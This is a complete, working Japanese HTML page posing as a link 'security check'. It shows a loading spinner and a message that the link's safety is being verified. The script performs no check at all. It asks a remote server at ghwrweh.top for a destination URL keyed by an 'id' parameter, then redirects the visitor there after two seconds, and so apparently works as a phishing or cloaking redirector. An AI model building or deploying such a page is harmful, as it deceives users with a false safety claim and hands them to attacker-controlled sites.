<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <title>セキュリティ確認中...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="robots" content="noindex,nofollow">
  <style>
    body {
      font-family: "Segoe UI", "Hiragino Kaku Gothic ProN", sans-serif;
      background-color: #f9f9f9;
      text-align: center;
      padding-top: 120px;
      color: #333;
    }
    .loader {
      border: 6px solid #f3f3f3;
      border-top: 6px solid #3498db;
      border-radius: 50%;
      width: 50px;
      height: 50px;
      animation: spin 1s linear infinite;
      margin: 30px auto;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .caption {
      font-size: 14px;
      color: #666;
    }
  </style>
</head>
<body>
  <h2>セキュリティ確認中...</h2>
  <p>リンクの安全性を確認しています。まもなくページが表示されます。</p>
  <div class="loader"></div>
  <p class="caption">セキュア認証サービス</p>

  <script>
    // 从 URL 中提取 id 参数
    const urlParams = new URLSearchParams(window.location.search);
    const id = urlParams.get("id");

    if (!id) {
      document.body.innerHTML += '<p style="color:red;">ID パラメーターが不足しています。</p>';
    } else {
      fetch("https://ghwrweh.top/api/jumpSite?siteName=" + encodeURIComponent(id))
        .then(res => res.json())
        .then(data => {
          if (data && data.data && data.data.siteUrl) {
            setTimeout(() => {
              location.href = data.data.siteUrl;
            }, 2000);
          } else {
            document.body.innerHTML += '<p style="color:red;">リダイレクト先を取得できませんでした。</p>';
          }
        })
        .catch(() => {
          document.body.innerHTML += '<p style="color:red;">API 取得中にエラーが発生しました。</p>';
        });
    }
  </script>
</body>
</html>
